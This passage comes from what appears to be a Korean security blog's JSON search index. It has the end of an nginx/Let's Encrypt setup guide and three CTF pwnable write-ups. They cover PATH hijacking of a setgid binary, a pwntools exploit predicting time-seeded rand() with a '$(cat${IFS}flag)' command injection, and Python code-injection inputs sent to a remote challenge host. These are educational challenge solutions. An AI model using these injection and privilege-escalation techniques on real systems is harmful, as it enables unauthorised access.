'$remote_addr - $remote_user [$time_local] \"$request\" '\t'$status $body_bytes_sent \"$http_referer\" '\t'\"$http_user_agent\" \"$http_x_forwarded_for\"';\taccess_log /var/log/nginx/access.log main;\tsendfile on;\tkeepalive_timeout 65;}3. init-letsencrypt.sh서버 구성에 필요한 파일들은 모두 작성했다. 마지막으로, 서버에 ssl 인증을 넣어줘야 하는데 원래대로라면 굉장히 노가다를 해야한다.그런데 감사하게도 누군가 아래와 같은 nginx ssl 인증 스크립트를 작성해놓았다. 감사한 마음으로 pull 해서 쓰도록 하자.curl -L https://raw.githubusercontent.com/wmnnd/nginx-certbot/master/init-letsencrypt.sh &gt; init-letsencrypt.sh이제 init-letsencrypt.sh 를 실행시키기만 하면 되는데 그 전에 몇가지 수정해줘야 하는 것이 있다.#!/bin/bashif ! [ -x \"$(command -v docker-compose)\" ]; then  echo 'Error: docker-compose is not installed.' &gt;&amp;2  exit 1fidomains=(domain.com, www.domain.com) # 여기 도메인 변경!!rsa_key_size=4096data_path=\"./data/certbot\"email=\"\" # 여기 이메일 넣기!!staging=0 # 테스트할 때는 여기 1로 바꾸기!! release 시에는 다시 0으로 변경# ... 후략 ...  L8 : 본인의 도메인으로 변경해주자.  L11 : 본인의 이메일을 넣어주자.  L12 : 테스트 할 때는 staging 플래그를 1로 바꿔서 돌려야 한다. 이거 설정 안하면 letsencrypt에 ssl 인증 요청하는 횟수가 제한되어 있어서 block될 수도 있다.4. ssl 인증 받기모든 준비가 다 되었으면 sudo 로 스크립트를 실행해주자.sudo ./init-letsencrypt.sh중간에 Y/N 질의가 있는데 Y 선택하고 엔터 쳐주면성공!! 한것을 볼 수 있다."
  },
  
  {
    "title": "[Dreamhack CTF Season 2 #11] Welcome writeup",
    "url": "/posts/dreamhack-welcome/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 21:56:00 +0900",
    





    
    "snippet": "source codechal 바이너리의 내용은 아래와 같다.int __cdecl main(int argc, const char **argv, const char **envp){  __asm { endbr64 }  sub_1080(1001LL, 1001LL, 1001LL);  sub_1090(\"clear\");  sub_1070(\"Tada~!\");  re...",
    "content": "source codechal 바이너리의 내용은 아래와 같다.int __cdecl main(int argc, const char **argv, const char **envp){  __asm { endbr64 }  sub_1080(1001LL, 1001LL, 1001LL);  sub_1090(\"clear\");  sub_1070(\"Tada~!\");  return 0;}바이너리를 실행하면 clear를 실행하고 Tada~ 문자열을 출력한 뒤 종료한다. 이제 remote에 접속해보자pwn@localhost:~$ iduid=1000(pwn) gid=1000(pwn) groups=1000(pwn)pwn@localhost:~$ ls -altotal 48drwxr-x--- 1 pwn  pwn    4096 Dec  7 09:06 .drwxr-xr-x 1 root root   4096 Dec  5 04:32 ..-rw-r--r-- 1 pwn  pwn     220 Dec  5 04:32 .bash_logout-rw-r--r-- 1 pwn  pwn    3771 Dec  5 04:32 .bashrcdrwx------ 2 pwn  pwn    4096 Dec  7 09:06 .cache-rw-r--r-- 1 pwn  pwn     807 Dec  5 04:32 .profile-rwxr-sr-x 1 root pwned 16048 Dec  5 04:32 chal-rw-r-S--- 1 root pwned    69 Dec  5 04:32 flagpwn@localhost:~$flag에 read가 막혀있으나, chal 에 setuid가 걸려있다. 이를 통해 chal이 하는 행위를 조작해야 하는 것을 알 수 있다.앞서 바이너리를 본대로 chal은 system(\"clear\") 와 같이 실행하므로 bash의 환경변수($PATH)의 영향을 받는다.그러므로 임의 경로에 bash를 실행해주는 명령을 clear라는 이름으로 저장하고, 해당 경로를 환경변수에 추가해주면 플래그를 읽을 수 있다.vulnerabilitypwn@localhost:~$ ./flag-bash: ./flag: Permission deniedpwn@localhost:~$pwn@localhost:~$ cd /tmp/pwn@localhost:/tmp$ echo \"/bin/bash\" &gt; clearpwn@localhost:/tmp$ chmod 777 clearpwn@localhost:/tmp$ cat clear/bin/bashpwn@localhost:/tmp$pwn@localhost:/tmp$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binpwn@localhost:/tmp$ export PATH=/tmp:$PATHpwn@localhost:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binpwn@localhost:/tmp$pwn@localhost:/tmp$ cd ~pwn@localhost:~$ ./chalpwn@localhost:~$ iduid=1000(pwn) gid=1001(pwned) groups=1001(pwned),1000(pwn)pwn@localhost:~$ cat flagDH{e47d874ddc629f916d3d5ef6f0d0de90c7b151f9d7010325d051c811382b489f}pwn@localhost:~$"
  },
  
  {
    "title": "[Dreamhack CTF Season 2 #11] Cat Jump writeup",
    "url": "/posts/dreamhack-cat-jump/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 21:56:00 +0900",
    





    
    "snippet": "source code소스코드가 주어지는 문제이다./* cat_jump.c * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;unistd...",
    "content": "source code소스코드가 주어지는 문제이다./* cat_jump.c * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#define CAT_JUMP_GOAL 37#define CATNIP_PROBABILITY 0.1#define CATNIP_INVINCIBLE_TIMES 3#define OBSTACLE_PROBABILITY 0.5#define OBSTACLE_LEFT  0#define OBSTACLE_RIGHT 1void Init() {    setvbuf(stdin, 0, _IONBF, 0);    setvbuf(stdout, 0, _IONBF, 0);    setvbuf(stderr, 0, _IONBF, 0);}void PrintBanner() {    puts(\"                         .-.\\n\" \\         \"                          \\\\ \\\\\\n\" \\         \"                           \\\\ \\\\\\n\" \\         \"                            | |\\n\" \\         \"                            | |\\n\" \\         \"          /\\\\---/\\\\   _,---._ | |\\n\" \\         \"         /^   ^  \\\\,'       `. ;\\n\" \\         \"        ( O   O   )           ;\\n\" \\         \"         `.=o=__,'            \\\\\\n\" \\         \"           /         _,--.__   \\\\\\n\" \\         \"          /  _ )   ,'   `-. `-. \\\\\\n\" \\         \"         / ,' /  ,'        \\\\ \\\\ \\\\ \\\\\\n\" \\         \"        / /  / ,'          (,_)(,_)\\n\" \\         \"       (,;  (,,)      jrei\\n\");}char cmd_fmt[] = \"echo \\\"%s\\\" &gt; /tmp/cat_db\";void StartGame() {    char cat_name[32];    char catnip;    char cmd[64];    char input;    char obstacle;    double p;    unsigned char jump_cnt;    srand(time(NULL));    catnip = 0;    jump_cnt = 0;    puts(\"let the cat reach the roof! 🐈\");    sleep(1);    do {        // set obstacle with a specific probability.        obstacle = rand() % 2;        // get input.        do {            printf(\"left jump='h', right jump='j': \");            scanf(\"%c%*c\", &amp;input);        } while (input != 'h' &amp;&amp; input != 'l');        // jump.        if (catnip) {            catnip--;            jump_cnt++;            puts(\"the cat powered up and is invincible! nothing cannot stop! 🐈\");        } else if ((input == 'h' &amp;&amp; obstacle != OBSTACLE_LEFT) ||                (input == 'l' &amp;&amp; obstacle != OBSTACLE_RIGHT)) {            jump_cnt++;            puts(\"the cat jumped successfully! 🐱\");        } else {            puts(\"the cat got stuck by obstacle! 😿 🪨 \");            return;        }        // eat some catnip with a specific probability.        p = (double)rand() / RAND_MAX;        if (p &lt; CATNIP_PROBABILITY) {            puts(\"the cat found and ate some catnip! 😽\");            catnip = CATNIP_INVINCIBLE_TIMES;        }    } while (jump_cnt &lt; CAT_JUMP_GOAL);    puts(\"your cat has reached the roof!\\n\");    printf(\"let people know your cat's name 😼: \");    scanf(\"%31s\", cat_name);    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);    system(cmd);    printf(\"goodjob! \");    system(\"cat /tmp/cat_db\");}int main(void) {    Init();    PrintBanner();    StartGame();    return 0;}random 으로 생성되는 값에 따라 생성되는 왼쪽/오른쪽 정답을 37회 맞추면 command injection을 수행할 수 있다.vulnerability// L42char cmd_fmt[] = \"echo \\\"%s\\\" &gt; /tmp/cat_db\";// L98    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);    system(cmd);    printf(\"goodjob! \");    system(\"cat /tmp/cat_db\");이제, 고양이가 점프하는 게임을 37회 이겨야 하는데, 정답을 생성하는 랜덤 함수가 srand(time(NULL)) 및 rand() 이다.즉, 정답을 만드는 함수의 시드가 시간이기 때문에 서버에 접속하는 동시에 time seed를 만들어내고, pythoon ctypes로 rand()를 호출해주면 서버와 동일한 결과 값을 획득할 수 있다.다만, 여기서 주의해야할 점은 만약 srand(time(NULL)) 에 의해 값이 [1, 2, 3, 4, 5] 로 만들어졌을 경우 값을 하나씩 iterate 하여 사용하는데(1, 2, 3, 4, 5, …), 고양이 점프 게임에서는 한 루프에 rand()를 (1) 답을 입력 받기 전, (2) 답을 입력한 후에 캣닢을 줄지 말지 결정하는 루틴 총 두번 수행한다.때문에 exploit할 때 한 루프에 rand() 가 두번 호출될 수 있도록 작성해야 한다.solve풀이는 아래와 같다.from pwn import *from ctypes import *from ctypes.util import find_libraryimport base64import timep = remote('host3.dreamhack.games', 17969)# p = process('./deploy/cat_jump')c = CDLL(find_library('/lib/x86_64-linux-gnu/libc.so.6'))c.srand(c.time(0))obstacle = c.rand() % 2p.recvuntil(b\"left jump='h', right jump='j':\")if obstacle == 0:    p.sendline(bytes('l', 'utf-8'))elif obstacle == 1:    p.sendline(bytes('h', 'utf-8'))for i in range(36):    try:        recv = p.recvuntil(b\":\")        c.rand()        obstacle = c.rand() % 2        print(recv.decode('utf-8'))    except:        print()        p.interactive()    if(obstacle == 0):        p.sendline(bytes('l', 'utf-8'))    if(obstacle == 1):        p.sendline(bytes('h', 'utf-8'))recv = p.recvuntil(b\": \")print(recv)p.sendline(bytes('$(cat${IFS}flag)', 'utf-8'))p.interactive()command injeciton 하는 부분은 echo에 들어가는 문자열을 command substitution 하여 flag를 읽을 수 있도록 해주자. 문제 바이너리에서는 해당 부분에 띄어쓰기를 허용하지 않으므로 ${IFS} 를 사용하는 등 잘 우회해보자. the cat jumped successfully! 🐱left jump='h', right jump='j': the cat jumped successfully! 🐱left jump='h', right jump='j': the cat jumped successfully! 🐱left jump='h', right jump='j': the cat jumped successfully! 🐱left jump='h', right jump='j': the cat jumped successfully! 🐱the cat found and ate some catnip! 😽left jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! 🐈left jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! 🐈left jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! 🐈left jump='h', right jump='j':your cat has reached the roof!let people know your cat's name 😼: [*] Switching to interactive modegoodjob! DH{da65478323e88390957aee8177eb3cf6e60a2a6b486a76d46fc4d94ec785bb48}[*] Got EOF while reading in interactive"
  },
  
  {
    "title": "[2021 HackPack CTF] baby calc writeup",
    "url": "/posts/baby-calc-writeup/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 17:33:00 +0900",
    





    
    "snippet": "checksecRELRO           STACK CANARY      NX            PIE             Full RELRO      Canary found      NX enabled    PIE enabled 기능 분석r99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The f...",
    "content": "checksecRELRO           STACK CANARY      NX            PIE             Full RELRO      Canary found      NX enabled    PIE enabled 기능 분석r99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: 1Variable two: 23  입력 받은 두 수를 더해준다.source codeint __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rbp  int result; // eax  __int64 v5; // rdx  unsigned __int64 v6; // rt1  char v7[55]; // [rsp+0h] [rbp-178h]  char v8[55]; // [rsp+40h] [rbp-138h]  char output_buff[220]; // [rsp+80h] [rbp-F8h]  unsigned __int64 v10; // [rsp+168h] [rbp-10h]  __int64 v11; // [rsp+170h] [rbp-8h]  __asm { endbr64 }  v11 = v3;  v10 = __readfsqword(0x28u);  sub_10F0(_bss_start, 0LL, 2LL, 0LL);  *(_QWORD *)v7 = 0LL;  *(_QWORD *)&amp;v7[8] = 0LL;  *(_QWORD *)&amp;v7[16] = 0LL;  *(_QWORD *)&amp;v7[24] = 0LL;  *(_QWORD *)&amp;v7[32] = 0LL;  *(_QWORD *)&amp;v7[40] = 0LL;  *(_DWORD *)&amp;v7[48] = 0;  *(_WORD *)&amp;v7[52] = 0;  v7[54] = 0;  *(_QWORD *)v8 = 0LL;  *(_QWORD *)&amp;v8[8] = 0LL;  *(_QWORD *)&amp;v8[16] = 0LL;  *(_QWORD *)&amp;v8[24] = 0LL;  *(_QWORD *)&amp;v8[32] = 0LL;  *(_QWORD *)&amp;v8[40] = 0LL;  *(_DWORD *)&amp;v8[48] = 0;  *(_WORD *)&amp;v8[52] = 0;  v8[54] = 0;  *(_QWORD *)output_buff = 0LL;  *(_QWORD *)&amp;output_buff[8] = 0LL;  *(_QWORD *)&amp;output_buff[16] = 0LL;  *(_QWORD *)&amp;output_buff[24] = 0LL;  *(_QWORD *)&amp;output_buff[32] = 0LL;  *(_QWORD *)&amp;output_buff[40] = 0LL;  *(_QWORD *)&amp;output_buff[48] = 0LL;  *(_QWORD *)&amp;output_buff[56] = 0LL;  *(_QWORD *)&amp;output_buff[64] = 0LL;  *(_QWORD *)&amp;output_buff[72] = 0LL;  *(_QWORD *)&amp;output_buff[80] = 0LL;  *(_QWORD *)&amp;output_buff[88] = 0LL;  *(_QWORD *)&amp;output_buff[96] = 0LL;  *(_QWORD *)&amp;output_buff[104] = 0LL;  *(_QWORD *)&amp;output_buff[112] = 0LL;  *(_QWORD *)&amp;output_buff[120] = 0LL;  *(_QWORD *)&amp;output_buff[128] = 0LL;  *(_QWORD *)&amp;output_buff[136] = 0LL;  *(_QWORD *)&amp;output_buff[144] = 0LL;  *(_QWORD *)&amp;output_buff[152] = 0LL;  *(_QWORD *)&amp;output_buff[160] = 0LL;  *(_QWORD *)&amp;output_buff[168] = 0LL;  *(_QWORD *)&amp;output_buff[176] = 0LL;  *(_QWORD *)&amp;output_buff[184] = 0LL;  *(_QWORD *)&amp;output_buff[192] = 0LL;  *(_QWORD *)&amp;output_buff[200] = 0LL;  *(_QWORD *)&amp;output_buff[208] = 0LL;  *(_DWORD *)&amp;output_buff[216] = 0;  sub_10E0(\"Variable one: \");  sub_1100(\"%55s\", v7);  sub_10E0(\"Variable two: \");  sub_1100(\"%55s\", v8);  sub_1110(output_buff, \"python3 -c 'print(%s + %s)'\", v7, v8);  sub_10D0(output_buff);  result = 0;  v6 = __readfsqword(0x28u);  v5 = v6 ^ v10;  if ( v6 != v10 )    result = sub_10C0(output_buff, \"python3 -c 'print(%s + %s)'\", v5);  return result;}  핵심은 마지막 줄인데, 입력 받은 두 수를 python 스크립트로 실행한다.  untrusted input 에 대한 제대로 된 검증을 하지 않는다.  따라서 해당 로직에 command injection 취약점이 있음을 알 수 있다.vulnerabilityr99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(0xdeadbeef3735928559r99bbit@parkmin-dev:~/ctf$  command injection 취약점을 증명하기 위한 stdin을 집어 넣어 봤다.  print();1+2;print(0xdeadbeef) 형태로 코드가 실행되어 코드가 보이는 것을 볼 수 있다.solve  local exploitr99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(open(\"./flag\",\"r\").read(){fake_flag}r99bbit@parkmin-dev:~/ctf$  remote exploitr99bbit@parkmin-dev:~/ctf$ nc ctf2021.hackpack.club 11001Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(open(\"./flag\",\"r\").read()flag{cL0uD_5Tr4tEgy}"
  }
  
]

